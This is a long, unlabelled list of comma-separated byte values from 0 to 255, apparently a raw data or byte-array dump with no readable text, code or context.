242,251,184,58,120,42,244,190,135,250,179,183,237,156,195,198,4,13,8,19,16,93,168,163,246,14,225,231,143,235,117,77,11,76,251,139,17,28,27,78,18,225,251,68,170,73,56,95,182,181,106,17,39,77,113,17,156,3,69,7,95,146,223,142,244,102,117,33,59,113,100,50,42,12,114,50,193,146,150,111,82,211,35,217,143,33,96,44,198,115,160,182,225,22,55,113,218,246,138,81,6,11,196,143,145,205,180,32,78,33,252,251,164,250,160,234,169,138,195,65,0,67,9,95,15,74,230,225,77,28,225,251,230,188,127,25,66,92,239,64,75,11,74,7,30,146,229,87,162,73,98,107,164,185,126,27,35,2,111,144,156,3,90,4,44,202,157,140,234,103,96,62,33,125,39,52,26,27,114,177,205,143,156,107,85,211,48,217,159,48,114,54,217,62,166,173,177,99,59,117,218,245,150,31,81,91,220,218,140,235,4,98,95,100,233,161,173,165,252,252,238,170,207,22,74,31,87,71,10,31,84,251,79,15,175,224,253,240,46,107,22,48,254,16,18,49,74,7,30,151,250,95,70,85,46,45,226,229,114,95,57,58,116,157,204,26,77,91,75,208,223,148,123,59,103,111,124,59,97,104,120,5,118,172,136,131,130,108,31,151,35,155,14,48,44,102,179,102,161,190,246,100,126,237,139,166,214,19,23,85,192,216,79,232,5,43,21,33,237,186,249,170,161,170,239,172,145,13,30,85,16,26,70,81,78,175,76,80,251,167,251,245,37,48,124,41,239,70,1,11,28,9,1,151,219,68,75,79,103,45,173,162,102,104,37,64,111,192,198,78,92,72,83,158,217,144,123,116,112,111,40,37,97,63,60,33,38,222,218,225,214,110,3,135,150,193,14,122,113,110,149,39,160,173,160,46,114,254,208,166,192,92,10,25,210,171,59,231,4,114,75,102,160,178,190,166,224,179,165,153,195,29,4,3,15,1,16,69,76,246,94,13,230,186,161,125,49,40,10,102,254,98,65,28,16,11,147,215,144,20,20,75,60,97,240,255,108,55,32,125,40,203,152,74,91,68,140,143,129,202,105,44,34,45,124,63,20,126,96,50,55,180,162,145,128,112,144,154,223,155,20,42,123,127,215,39,166,162,172,46,42,154,218,175,146,5,6,123,128,223,12,167,23,112,29,33,248,176,226,250,250,187,253,236,161,66,80,5,1,27,54,81,20,163,94,20,163,228,169,50,104,56,15,113,163,68,18,12,47,9,198,140,252,79,91,78,122,107,173,106,114,121,55,34,47,145,157,76,115,95,220,129,159,139,105,61,122,36,124,209,123,120,106,50,49,244,136,149,199,124,200,156,192,152,12,126,59,124,206,186,204,189,251,1,96,191,171,187,147,90,76,17,131,196,76,224,85,54,5,251,227,240,190,168,160,189,175,155,233,27,27,25,1,3,28,60,64,171,12,16,164,240,167,124,39,119,74,95,247,89,10,8,60,14,154,225,149,25,0,77,118,142,241,89,103,33,38,50,101,137,148,74,52,65,128,128,141,148,113,2,52,151,124,180,59,57,59,98,42,177,202,141,178,110,156,149,206,137,82,42,55,74,152,240,160,231,172,103,123,236,218,187,90,10,23,75,206,195,87,169,69,107,83,186,160,246,233,164,170,224,245,183,0,84,31,30,90,90,82,56,77,236,31,137,170,242,248,33,111,46,15,113,52,89,77,12,47,69,157,220,202,125,16,55,38,155,172,63,126,33,111,112,37,197,53,75,28,65,183,155,141,152,126,219,52,193,63,167,34,122,108,115,114,175,173,193,182,51,143,146,150,203,89,104,59,23,215,168,252,188,168,118,114,232,247,187,91,26,79,88,215,205,79,186,4,4,82,233,149,162,221,166,242,254,225,246,91,6,11,95,21,2,27,75,75,69,77,207,170,242,186,38,61,122,22,62,115,10,74,26,45,15,218,198,139,78,82,119,39,151,235,115,126,97,57,62,175,154,103,85,47,16,212,134,131,10,124,177,48,202,56,224,114,109,49,96,186,229,175,202,168,110,140,193,221,150,21,1,113,93,156,184,246,222,185,111,228,247,239,187,16,80,14,75,194,222,23,11,6,0,19,165,230,178,228,168,120,224,249,156,60,90,77,30,0,10,67,4,77,18,74,145,228,177,255,126,127,122,124,106,101,13,94,78,104,7,128,159,205,14,16,119,108,141,238,122,44,104,39,58,252,154,56,78,125,0,199,135,254,74,122,210,46,144,112,189,96,36,124,55,190,244,252,146,190,29,192,135,217,7,95,24,49,92,197,168,170,250,16,53,167,242,243,187,1,2,14,87,128,11,76,22,88,18,95,167,244,224,163,186,53,230,137,189,0,84,67,13,80,140,25,25,64,1,86,157,230,227,161,59,111,52,122,106,31,72,13,71,60,153,218,159,255,18,6,108,38,207,167,58,103,109,119,33,173,158,53,11,117,80,197,140,207,83,58,200,110,212,40,173,112,100,97,96,240,202,235,150,172,51,192,219,150,1,20,22,114,93,215,234,225,174,16,37,238,230,237,183,29,90,7,226,218,71,17,1,4,18,69,177,248,237,56,188,106,161,254,177,71,92,14,36,8,152,64,77,78,75,43,207,152,241,102,123,35,54,86,44,47,43,91,26,46,153,157,154,153,78,82,35,126,133,58,123,60,54,101,32,190,192,93,76,117,218,204,139,129,125,126,129,54,242,197,162,48,46,48,122,247,229,170,194,241,233,192,195,156,93,82,11,44,30,198,186,247,189,28,105,243,166,236,183,65,81,28,185,128,64,23,87,88,3,19,177,67,176,31,191,109,231,244,225,94,22,78,47,30,142,69,77,72,75,87,139,202,177,97,60,104,106,58,106,111,91,77,42,48,134,221,204,144,34,10,59,150,151,113,33,47,54,50,106,166,198,102,114,116,157,128,199,154,92,105,222,46,208,241,160,106,122,104,110,252,169,241,204,169,233,198,167,135,18,20,24,55,12,20,231,175,189,28,9,186,232,181,61,25,77,92,167,135,65,76,16,27,28,142,150,25,224,83,166,123,252,168,239,65,59,64,45,92,192,23,94,64,1,208,132,202,245,54,125,121,54,97,106,111,118,79,108,112,132,155,156,220,71,82,35,192,142,43,123,110,43,117,32,175,251,110,62,41,139,150,168,131,87,101,134,143,206,253,180,122,126,104,97,171,163,222,160,242,156,144,145,221,86,83,91,112,12,84,164,163,252,15,103,230,239,161,47,71,17,14,247,150,11,26,80,66,56,137,251,21,171,25,240,57,254,251,119,71,34,74,46,17,157,0,44,85,52,208,138,144,183,4,123,36,41,103,32,46,120,80,42,104,159,199,194,203,71,195,50,217,155,48,115,102,56,127,160,236,251,123,99,115,197,128,192,129,87,14,134,193,145,191,236,98,109,104,50,229,165,176,171,230,253,170,129,215,64,30,1,10,18,68,187,254,186,21,113,255,253,182,49,65,17,31,229,139,91,26,31,26,27,202,251,21,162,93,168,42,176,255,50,91,72,2,127,8,148,74,95,68,65,219,212,192,161,51,50,59,105,38,32,52,120,90,1,119,136,138,134,109,19,156,43,188,244,126,49,47,223,96,162,170,185,57,114,116,218,155,142,57,16,122,144,193,212,165,189,36,109,14,236,190,165,161,179,163,165,140,209,22,28,30,14,31,74,77,164,176,189,21,232,255,141,240,42,26,3,36,187,194,83,22,1,85,0,218,254,68,240,31,108,107,226,251,114,11,81,77,43,71,140,75,67,93,90,154,207,218,234,44,46,79,124,59,42,52,107,91,126,117,218,194,220,116,84,150,59,203,243,104,123,39,202,110,186,183,223,100,62,125,216,187,195,81,23,25,203,131,155,169,162,58,5,100,250,161,210,234,167,173,253,235,203,88,64,13,17,99,13,75,166,183,63,72,232,234,248,232,47,8,3,64,165,64,68,78,64,83,18,158,189,30,66,9,108,120,251,225,102,94,62,18,43,137,128,13,84,64,26,146,196,152,227,116,48,63,106,122,114,104,58,1,109,171,202,226,151,110,82,211,45,207,153,126,6,58,198,39,179,176,172,54,96,239,159,187,145,57,23,91,198,172,205,235,27,32,11,96,244,224,161,184,167,230,244,172,202,66,7,13,90,27,52,26,76,247,77,5,253,161,140,236,61,0,17,108,224,28,65,7,81,85,80,142,219,15,68,31,97,93,240,252,44,29,39,125,49,219,152,85,94,7,64,193,207,136,49,38,97,37,112,51,114,113,113,127,114,165,247,204,156,116,94,211,43,200,15,120,99,120,215,46,160,250,221,119,34,183,128,164,139,19,70,15,193,143,82,186,82,106,82,100,160,230,255,236,187,179,241,240,195,67,70,24,90,90,69,31,75,225,94,9,249,243,170,189,46,42,16,47,165,72,65,87,77,7,0,143,149,78,69,76,46,43,241,199,118,54,55,112,47,137,214,90,77,72,11,219,207,137,101,124,99,111,106,36,114,123,106,60,109,175,136,203,220,62,75,219,156,200,69,112,107,102,217,111,179,252,237,117,124,154,145,183,206,5,12,0,214,218,82,250,25,123,69,96,244,234,255,186,187,150,175,239,219,50,92,13,76,19,91,84,26,181,6,28,228,177,255,36,127,91,81,48,226,10,95,12,85,95,159,136,193,3,45,81,46,74,235,123,105,104,36,80,41,144,245,12,77,10,155,208,141,218,116,32,109,45,40,122,102,125,97,33,44,244,132,146,199,36,198,199,217,139,83,123,112,122,163,53,186,189,177,118,42,188,157,164,142,93,2,80,204,196,79,253,23,98,14,126,172,180,185,186,252,170,165,172,165,84,1,66,65,71,74,79,12,251,74,15,253,172,246,113,51,108,96,44,175,93,65,12,51,95,214,220,140,65,82,93,46,107,173,17,108,96,35,34,43,155,134,78,50,80,135,208,141,152,122,102,49,61,58,160,101,127,113,33,108,189,136,207,230,112,192,223,206,217,21,60,49,118,197,166,160,250,170,4,32,240,216,254,139,27,25,75,128,143,94,188,31,45,19,189,244,182,239,168,241,179,177,248,138,69,11,85,30,1,74,84,26,176,94,138,225,183,238,50,127,41,17,119,227,90,80,70,117,9,129,140,149,71,27,31,54,158,238,55,55,121,82,102,53,137,121,74,31,28,216,192,196,218,15,61,49,204,58,180,88,53,120,115,55,223,154,155,252,124,196,129,228,137,82,100,119,16,219,250,160,174,183,37,101,188,222,254,71,27,71,25,204,223,94,231,94,0,12,177,228,162,238,240,204,176,253,244,90,88,64,79,90,19,6,24,63,187,6,149,230,240,253,115,114,96,77,106,52,93,75,93,121,20,138,140,153,21,64,55,60,159,171,127,110,107,120,123,241,158,123,80,100,91,254,198,132,152,32,218,109,209,124,253,59,117,120,39,108,222,171,147,237,117,135,211,206,129,29,81,59,125,219,190,166,167,170,117,123,188,224,254,25,90,66,23,219,196,67,176,65,18,13,254,181,162,173,168,167,188,185,236,73,22,18,95,1,27,71,85,81,93,6,148,194,161,230,24,47,49,122,62,111,64,34,78,46,70,128,158,141,5,69,48,63,133,236,127,24,121,36,60,230,221,123,0,60,70,198,198,132,23,60,138,96,185,36,231,48,109,106,33,230,244,250,138,171,55,196,144,206,28,10,1,59,124,149,237,241,191,185,110,171,240,239,187,1,26,27,102,194,193,12,64,7,70,8,164,228,236,191,190,48,224,237,239,91,77,19,79,8,4,74,77,81,83,61,133,232,187,238,113,111,48,51,103,50,68,81,88,122,72,193,130,214,6,66,103,108,133,186,127,38,106,115,32,172,145,57,66,125,72,204,139,141,87,49,151,119,145,58,246,114,34,127,60,240,177,170,192,166,124,200,129,154,0,17,11,106,76,131,225,179,236,8,38,225,231,249,161,65,3,14,21,150,90,87,74,4,93,19,233,177,227,9,250,41,187,142,233,73,71,23,13,26,134,6,92,72,74,74,149,232,227,252,35,127,48,63,119,125,72,15,7,46,159,218,157,138,79,0,58,56,134,250,127,8,104,114,43,190,154,51,14,37,10,205,130,206,16,113,156,110,216,38,246,117,57,104,127,251,233,171,202,168,110,219,129,199,7,29,24,7,70,131,186,177,249,21,37,177,254,240,183,24,108,0,251,204,67,63,11,79,30,29,233,182,174,20,189,49,229,190,244,64,76,18,42,71,221,94,21,23,17,74,157,250,161,17,32,121,43,33,113,125,6,67,114,126,196,129,220,149,109,16,113,46,135,33,127,60,107,63,34,230,154,106,13,101,139,140,151,207,30,15,210,43,138,185,189,43,71,48,49,186,177,184,209,173,143,219,195,221,94,92,86,99,13,196,177,163,207,72,40,176,140,188,227,27,16,76,180,211,70,82,11,30,93,84,187,65,181,15,235,32,242,163,186,27,46,2,41,27,135,30,88,73,95,17,201,219,183,120,96,111,43,39,46,117,91,86,119,45,136,134,128,138,83,82,47,139,151,97,115,47,60,53,50,171,198,100,38,109,197,134,203,159,30,105,164,219,203,185,180,122,126,104,101,178,173,247,186,168,191,192,145,131,0,95,22,109,76,78,186,181,189,11,51,149,212,249,111,27,10,111,229,209,11,94,89,85,2,209,187,54,183,93,235,107,225,237,186,65,118,26,49,80,148,70,103,84,17,154,142,152,172,51,35,111,56,61,55,49,116,75,126,36,136,218,128,138,5,129,35,193,213,125,115,47,63,48,97,178,218,123,107,62,157,212,205,217,12,43,194,223,208,169,230,54,109,127,53,165,239,160,160,183,253,200,207,218,89,19,90,26,76,73,234,170,236,28,38,243,252,187,88,77,22,65,185,206,83,10,87,19,7,141,177,21,170,81,177,57,166,175,60,64,63,14,80,74,247,19,77,10,48,128,216,209,161,122,83,79,43,103,101,63,59,67,31,47,202,147,151,128,31,211,43,204,133,104,33,47,108,62,235,252,185,121,122,100,157,146,214,153,104,87,203,131,138,189,186,36,47,41,182,178,255,171,235,233,179,159,140,192,6,13,11,92,8,81,191,173,160,85,117,161,250,134,37,74,15,0,165,146,28,93,75,18,126,158,168,70,177,93,252,33,240,175,109,73,36,21,124,65,223,74,91,72,83,192,147,249,244,109,50,121,112,59,48,111,107,85,53,48,136,159,157,100,80,139,58,140,132,58,115,102,196,117,170,252,176,111,38,101,201,150,192,19,13,85,173,212,138,186,180,98,97,122,187,160,186,241,213,176,253,223,207,70,10,66,76,75,106,81,202,175,225,80,188,225,188,187,111,26,3,24,180,91,83,12,85,21,18,158,255,89,246,78,46,42,236,191,108,44,99,86,52,8,214,16,30,16,64,131,213,218,245,122,96,97,40,51,55,30,55,33,126,48,132,215,157,116,71,193,48,184,213,97,59,98,178,69,241,234,252,56,51,125,192,248,205,0,87,16,202,136,205,186,164,32,111,96,230,253,173,250,179,216,239,186,218,84,4,28,20,31,30,93,190,176,79,94,230,243,186,187,127,76,3,29,190,98,26,70,80,7,18,201,225,70,91,81,111,53,240,251,108,73,32,20,120,237,156,0,94,65,28,215,145,209,43,48,43,56,97,51,53,105,44,79,118,173,134,215,204,107,2,223,47,204,151,123,33,96,177,101,163,175,170,126,38,239,145,164,168,85,22,23,197,205,201,184,30,32,69,112,244,224,203,168,179,224,229,172,203,71,30,13,10,87,78,31,10,173,82,21,151,251,224,182,89,31,16,47,226,1,93,42,76,22,18,158,128,64,65,81,60,42,247,245,126,69,117,83,43,159,156,66,94,80,7,130,210,145,59,125,122,58,40,32,114,37,63,97,29,252,155,202,158,105,82,194,123,156,72,48,112,98,223,41,179,171,176,119,114,159,134,190,193,57,70,21,198,149,94,186,27,113,21,60,237,161,189,246,241,225,169,240,219,92,64,79,24,31,94,24,26,180,80,14,188,234,238,235,101,96,16,44,162,91,78,26,85,124,218,209,149,16,16,72,103,112,182,237,111,33,99,43,47,137,204,95,67,41,91,158,223,138,96,53,123,33,76,51,114,97,42,49,107,239,199,147,218,46,80,218,206,192,82,122,99,44,219,63,179,190,170,37,102,254,218,183,246,68,12,17,204,131,94,184,30,45,21,104,252,161,165,187,161,176,233,136,151,21,93,30,4,19,64,25,84,163,31,28,250,230,252,80,114,46,10,102,182,72,71,28,22,30,209,146,128,91,10,31,57,46,242,97,126,105,110,34,116,133,204,87,3,90,196,192,196,252,15,102,34,62,40,189,124,122,112,107,103,180,132,143,142,112,218,223,129,205,79,122,99,58,132,127,162,160,177,127,60,159,216,214,130,19,22,91,210,130,28,167,23,108,123,39,231,198,165,166,250,238,228,235,195,84,18,27,65,3,20,15,88,177,50,85,176,160,188,94,53,32,78,102,247,16,95,78,112,78,129,141,233,91,82,83,59,130,175,115,106,106,103,50,47,157,156,11,50,70,195,146,159,148,40,124,96,7,36,167,96,125,97,97,109,177,129,149,241,29,196,157,150,208,10,104,99,127,158,168,166,167,252,127,106,254,155,183,27,71,24,65,206,197,71,190,4,98,4,160,228,172,255,235,250,242,244,176,209,27,97,85,8,65,23,18,11,183,94,210,251,251,224,33,105,56,23,32,249,94,67,22,104,14,147,146,214,27,65,20,124,158,234,115,60,24,46,50,52,155,98,0,2,16,134,139,159,142,123,54,78,216,33,184,122,42,96,115,42,239,247,131,253,8,135,249,153,217,21,48,106,76,131,160,210,231,173,2,61,237,140,161,4,2,6,86,139,143,79,169,31,28,88,170,166,240,190,168,163,242,237,241,90,71,23,68,90,90,82,31,0,75,82,149,250,242,182,34,44,44,96,113,116,95,23,64,45,14,210,158,141,21,16,119,60,128,160,115,112,45,121,50,176,203,127,22,63,65,198,221,156,204,59,176,48,212,48,180,107,99,48,43,119,179,180,219,166,111,188,157,141,203,84,74,112,81,217,168,225,231,250,51,98,254,157,163,30,75,86,10,194,193,28,27,117,1,85,231,244,162,203,240,161,225,237,244,73,64,11,66,26,29,16,31,23,71,86,197,164,234,255,125,61,96,33,117,105,10,83,89,60,66,214,206,141,5,0,53,39,212,247,98,109,56,117,42,230,192,121,80,47,64,220,132,217,6,97,222,118,138,62,250,114,101,107,96,190,244,200,144,148,40,138,211,147,70,11,64,111,14,215,190,189,252,181,37,188,183,236,174,28,92,90,95,194,222,10,89,5,18,20,252,150,176,186,161,123,176,227,172,73,22,18,25,74,4,64,77,72,28,76,201,224,133,246,33,62,121,97,41,41,41,20,26,46,78,219,154,129,0,51,52,32,246,182,97,108,119,104,106,172,129,37,78,115,72,198,214,200,125,122,147,112,203,97,180,114,124,120,49,224,171,172,252,169,62,156,129,219,0,20,24,42,92,143,240,225,236,11,63,234,242,187,174,8,11,86,21,203,65,87,89,85,2,17,250,172,178,81,164,43,234,225,248,26,0,22,20,27,148,91,95,10,70,80,223,186,227,252,62,79,113,103,109,125,55,91,28,42,155,138,222,149,71,82,47,124,133,176,16,126,43,41,123,241,209,20,90,63,139,197,192,133,18,61,155,96,140,33,162,54,123,96,58,166,180,241,143,178,112,156,205,220,91,79,75,123,74,215,225,175,174,28,37,182,188,152,190,8,27,92,251,204,17,72,11,88,95,14,171,69,235,20,185,32,251,254,234,91,26,17,111,26,140,75,94,10,31,67,147,249,251,103,33,61,32,119,40,63,5,23,110,47,193,138,154,153,19,94,35,54,213,48,102,102,59,39,24,171,193,37,74,108,218,221,130,131,70,40,210,96,200,235,163,3,123,120,106,164,255,180,192,236,169,138,151,199,1,15,74,107,6,68,168,176,246,4,111,243,237,245,165,0,3,6,175,204,1,10,30,14,0,8,224,3,224,84,228,109,189,225,248,93,46,18,46,17,246,65,77,65,23,76,223,143,183,103,96,111,119,25,50,110,113,17,119,48,136,134,204,208,14,82,97,155,222,96,115,44,59,13,119,234,209,34,114,106,132,195,140,149,12,105,144,216,138,160,188,106,109,42,103,178,239,168,179,166,165,219,167,222,30,21,24,59,6,74,190,212,250,89,3,243,236,171,45,0,79,23,247,146,28,77,76,69,1,220,250,91,247,86,225,57,170,225,114,42,117,16,42,26,148,16,91,75,11,221,197,150,251,54,115,37,42,124,113,100,116,86,104,112,202,157,159,237,86,196,102,155,155,41,49,110,10,127,112,173,246,123,48,63,218,212,130,153,92,14,138,221,202,241,162,115,100,97,20,161,173,177,235,172,244,219,195,198,30,14,124,93,76,57,160,226,166,16,103,224,230,187,46,80,91,14,228,213,67,28,85,7,64,223,171,14,235,74,186,57,224,229,38,6,117,14,45,8,128,27,15,68,11,203,149,252,227,122,112,98,42,125,97,63,105,77,111,53,159,129,153,110,2,193,106,209,222,126,97,110,43,53,163,172,237,56,97,113,145,220,130,141,7,14,222,221,143,186,224,115,25,43,166,178,188,172,215,172,237,192,132,215,80,3,12,6,13,31,202,179,225,5,166,225,226,171,124,90,15,25,247,134,95,90,64,21,18,138,171,50,176,74,234,124,176,175,126,17,55,90,41,8,214,26,77,93,65,128,157,218,235,38,33,58,63,61,16,109,120,17,49,43,136,218,214,124,20,199,59,217,133,9,122,125,192,53,246,230,161,21,59,105,199,193,203,81,7,8,164,205,202,177,253,45,82,120,224,187,245,177,210,178,253,144,138,84,91,1,22,26,13,79,240,224,174,78,228,230,161,181,127,4,11,70,229,10,70,66,22,7,30,158,233,27,174,78,122,43,238,164,119,44,100,12,49,218,221,84,15,55,17,135,136,192,227,96,100,60,97,103,102,110,32,80,108,36,136,193,156,124,85,211,49,150,151,126,113,12,133,110,250,190,168,47,19,63,134,240,214,19,18,92,220,195,208,169,189,112,29,114,244,162,173,253,214,172,191,185,138,28,0,39,50,26,18,9,250,236,71,16,186,133,250,232,101,1,13,48,176,64,65,92,64,7,10,248,166,94,64,84,57,57,161,162,55,91,38,75,101,145,219,76,3,93,65,202,142,202,123,26,51,35,77,76,54,31,112,87,114,255,128,145,135,104,9,154,119,202,19,97,44,125,146,52,252,236,185,96,61,182,155,190,215,19,18,75,218,197,212,253,4,43,29,123,225,251,163,184,162,187,188,186,202,93,18,1,10,65,12,83,27,175,94,9,232,186,186,161,61,68,74,102,184,95,91,78,11,97,83,143,255,94,82,20,118,47,247,237,114,11,57,62,42,203,196,23,31,12,75,198,217,203,49,108,107,63,40,97,104,62,110,61,102,172,153,226,128,117,14,129,42,215,82,102,55,110,219,48,161,182,246,46,114,177,157,214,195,19,81,10,157,213,74,241,88,122,11,43,252,190,226,252,160,190,191,189,129,90,80,89,24,29,64,15,79,236,72,10,232,171,172,239,121,122,10,62,181,46,90,26,73,20,154,198,138,79,68,93,61,48,173,225,42,108,35,50,114,237,157,78,95,72,91,155,157,203,60,44,48,63,111,125,126,53,97,61,119,173,198,146,239,110,84,135,221,150,14,32,39,44,132,52,191,162,183,117,32,247,155,165,193,112,9,9,203,213,86,161,69,54,11,97,182,161,249,168,231,254,180,239,203,29,74,3,1,10,92,31,29,241,94,88,240,253,145,62,47,56,27,108,150,89,71,64,53,19,129,140,220,64,6,78,46,57,182,123,38,107,55,106,114,200,134,81,2,98,194,131,131,129,57,101,43,104,32,163,55,47,107,101,84,242,145,145,154,53,154,192,206,215,88,100,115,39,215,39,255,236,254,118,96,185,218,191,130,4,90,81,194,217,26,229,69,54,14,42,248,237,163,161,223,185,238,172,145,71,19,89,65,81,64,31,88,180,12,78,175,242,188,112,46,107,15,44,227,91,64,71,60,11,138,141,214,15,91,79,122,134,163,39,107,121,46,50,36,129,192,13,100,1,135,192,207,152,120,100,118,192,122,246,126,109,116,127,60,242,136,143,230,110,154,197,128,217,9,33,33,96,199,164,164,225,169,103,96,254,141,239,24,31,26,75,144,139,80,169,85,45,20,171,250,186,249,230,235,242,244,246,203,29,76,1,17,71,120,85,0,237,17,145,251,227,248,40,61,122,17,54,224,81,77,26,127,7,147,151,149,87,66,51,34,158,241,101,109,121,101,42,127,129,35,0,110,10,218,129,223,152,43,38,96,172,59,161,59,99,106,98,55,177,174,154,183,112,156,202,198,151,69,100,48,81,206,166,241,189,218,40,122,242,236,185,29,7,30,10,210,216,72,169,14,0,84,171,149,136,204,186,186,225,169,248,95,6,18,91,110,65,52,93,74,1,33,157,170,161,247,102,47,40,13,39,110,95,67,66,88,76,147,135,153,19,91,113,46,151,238,58,38,107,55,60,166,129,34,16,46,27,199,146,213,148,101,134,46,140,32,180,40,122,45,123,186,172,173,193,236,62,173,145,218,202,69,90,112,92,206,252,160,236,147,116,48,191,177,246,0,84,90,80,211,196,71,11,23,85,10,233,166,162,191,186,163,252,227,244,90,71,64,95,8,75,64,31,75,64,17,226,167,251,226,50,61,52,122,55,41,0,27,64,93,16,159,146,203,8,16,35,46,195,172,106,55,48,101,50,163,154,100,66,116,10,212,198,149,92,38,145,53,242,107,210,107,109,82,106,240,254,161,150,223,110,129,195,199,0,69,93,33,16,217,234,179,174,173,112,255,233,186,166,29,74,28,25,154,11,74,64,15,70,5,255,250,240,239,186,113,187,248,244,69,92,2,95,4,0,82,92,84,83,86,148,225,177,249,36,111,101,59,112,41,10,67,2,117,31,199,157,141,78,16,55,56,151,240,103,96,59,117,60,255,135,127,66,125,9,197,139,152,18,97,155,54,145,49,167,97,53,102,96,161,179,217,131,205,124,193,208,206,8,73,90,49,30,194,168,191,252,8,105,227,237,161,175,29,65,14,150,212,64,72,22,0,85,84,224,179,187,15,186,57,225,185,172,95,55,2,66,71,131,19,94,23,68,94,149,187,241,102,58,127,52,114,50,46,28,1,66,117,152,154,130,142,84,10,35,46,131,160,115,102,97,54,106,173,155,53,91,47,218,196,218,133,16,122,210,68,209,32,184,107,34,39,99,190,175,160,202,182,169,209,203,154,18,73,90,123,71,215,231,177,189,15,115,140,177,187,212,71,3,28,163,206,54,94,11,23,56,29,250,21,235,9,164,32,177,237,232,8,65,80,49,92,198,90,93,72,27,28,157,150,177,54,102,45,48,61,55,105,27,75,60,117,136,209,130,149,75,90,35,32,133,127,127,58,49,102,124,230,163,126,48,63,135,204,142,197,86,101,193,59,209,214,167,113,53,124,97,215,189,247,151,190,165,135,215,220,18,29,11,49,92,31,252,177,183,125,37,243,159,225,239,28,98,0,191,135,65,12,68,30,74,146,233,21,224,30,164,42,165,250,168,73,39,80,47,26,148,64,88,88,93,86,212,145,183,18,83,45,40,51,62,106,107,74,60,46,132,130,142,203,71,66,123,193,155,42,43,47,33,105,33,148,224,121,103,41,216,167,144,149,12,103,198,222,209,229,165,115,120,125,102,230,174,241,187,168,253,217,195,218,0,81,123,6,13,31,231,187,166,4,117,177,235,234,51,17,76,74,255,139,74,17,28,27,18,140,231,95,235,93,166,123,176,254,102,11,55,22,116,24,148,22,89,74,70,211,201,137,227,59,112,35,42,33,101,109,44,85,1,53,202,130,194,215,79,172,97,209,159,104,49,98,121,115,106,183,174,123,49,56,201,151,139,239,76,127,194,222,201,169,230,5,109,104,123,160,255,171,231,247,178,200,145,140,93,25,89,90,92,93,168,237,183,78,51,231,172,233,61,4,26,29,184,219,3,28,80,95,93,202,225,74,171,20,168,107,238,175,110,71,120,21,53,25,134,90,95,28,20,156,211,192,234,116,113,45,56,51,59,52,107,74,63,110,145,128,204,112,84,139,43,150,155,104,39,60,45,47,191,178,177,36,124,110,199,205,203,1,91,16,148,131,206,176,166,98,109,123,244,161,173,224,253,174,236,200,202,220,0,25,1,3,80,64,233,181,174,94,187,217,172,239,49,74,111,25,247,154,26,12,64,11,64,136,248,21,183,63,107,122,173,254,111,29,126,80,127,4,156,84,5,55,66,154,149,150,235,116,42,100,58,61,114,37,106,17,119,90,155,144,158,112,19,221,53,129,159,100,43,60,222,47,153,236,171,97,114,87,201,154,203,26,23,91,203,205,154,165,246,122,5,42,189,234,163,173,204,178,191,196,155,65,4,85,74,90,92,68,250,170,86,20,175,226,240,238,49,80,3,14,181,27,17,28,75,20,0,209,250,87,235,72,46,47,176,191,108,69,55,2,46,135,135,85,31,72,64,133,207,152,241,125,49,37,59,107,16,125,107,79,63,179,193,141,204,124,2,199,97,202,131,48,115,124,153,104,235,230,237,119,38,41,173,254,214,93,12,25,179,217,159,176,88,119,11,97,160,186,191,224,162,172,191,248,155,84,80,68,14,19,30,63,168,163,70,8,255,231,238,173,46,29,15,113,228,11,65,26,22,72,0,141,253,69,69,77,60,57,235,253,49,7,38,106,44,129,154,81,31,92,64,130,139,142,103,102,122,100,109,92,124,125,25,74,44,250,218,193,204,101,84,129,35,208,73,45,111,44,199,101,166,173,147,62,102,188,145,174,144,117,87,91,202,149,79,160,67,114,29,120,250,161,239,171,161,145,245,172,205,70,0,1,75,19,92,19,81,225,94,85,245,167,238,241,111,54,11,113,185,68,11,7,75,7,91,141,137,69,120,78,39,107,242,172,29,69,80,33,41,133,198,66,65,7,95,131,131,148,12,61,46,35,97,35,48,110,49,32,118,244,136,204,158,110,21,197,220,144,69,122,99,44,152,13,246,255,181,51,126,236,139,183,130,71,14,51,198,143,86,235,4,113,29,39,172,178,228,164,252,229,238,172,209,12,18,13,17,7,75,79,80,234,61,21,250,188,169,125,36,52,15,125,176,81,17,94,81,78,199,198,203,3,27,20,56,47,172,244,29,111,35,33,52,159,190,35,21,10,128,202,131,251,124,102,43,100,40,58,48,101,49,63,60,189,202,199,218,86,71,249,156,139,12,42,99,120,217,51,252,250,175,40,48,236,157,246,138,6,22,16,204,149,87,226,114,106,29,41,166,235,226,186,252,189,238,234,166,29,18,30,4,1,94,68,61,194,82,28,232,235,253,106,46,122,65,62,249,90,83,71,37,100,220,220,153,91,30,78,104,45,176,127,55,33,62,123,49,133,154,66,115,80,194,139,153,209,105,103,46,117,33,246,96,126,116,122,119,169,208,131,130,50,222,196,219,206,29,38,99,124,196,164,161,243,241,119,123,239,192,167,150,5,26,16,194,218,31,186,23,48,29,60,244,162,239,231,160,224,253,172,140,90,14,66,109,0,66,84,84,251,82,68,253,183,252,43,53,46,91,62,184,12,74,64,117,9,131,151,208,4,16,5,97,143,173,63,114,31,117,37,45,133,198,11,111,10,194,133,223,204,32,36,48,203,123,166,98,109,108,96,50,209,155,193,169,117,218,197,129,209,10,60,99,74,133,186,153,203,248,119,114,239,219,166,27,90,26,1,213,219,86,193,23,122,9,187,252,227,186,168,160,130,180,241,92,29,96,24,0,71,74,72,72,181,82,139,253,201,226,83,52,56,80,62,181,92,67,100,50,14,242,248,149,89,6,50,32,232,238,39,109,96,37,38,47,159,123,11,105,12,195,128,141,221,39,197,118,209,124,180,51,100,120,107,126,179,180,141,255,107,156,198,215,152,82,42,106,87,197,164,191,233,181,110,13,238,241,227,65,31,14,86,167,128,16,251,4,84,9,160,229,172,173,231,186,185,225,186,65,29,78,1,69,125,0,84,76,26,82,207,248,246,253,106,115,123,76,88,63,16,10,28,60,101,210,151,153,87,91,69,38,207,160,33,114,61,101,35,172,152,103,66,27,89,152,192,233,139,36,222,119,140,123,180,111,116,44,122,162,233,184,154,190,51,135,154,129,144,79,14,106,76,215,180,250,174,198,53,231,247,236,254,109,95,24,11,206,131,10,74,67,30,82,171,229,170,238,230,160,226,228,239,88,65,2,26,16,119,90,31,88,90,72,226,230,183,251,50,114,122,43,46,100,26,23,64,50,94,214,157,138,31,52,35,60,151,163,49,126,43,46,34,252,129,37,16,111,72,212,156,217,13,123,149,96,216,40,180,97,18,58,101,233,229,170,144,252,107,198,145,129,18,79,93,1,74,202,186,179,252,251,53,182,231,245,185,24,19,66,21,128,91,82,17,88,3,122,171,253,172,164,234,44,230,175,248,69,93,2,66,74,198,82,88,81,21,94,143,171,247,170,62,98,52,39,48,110,14,27,92,60,69,133,154,145,31,29,109,55,142,226,58,44,121,48,125,246,221,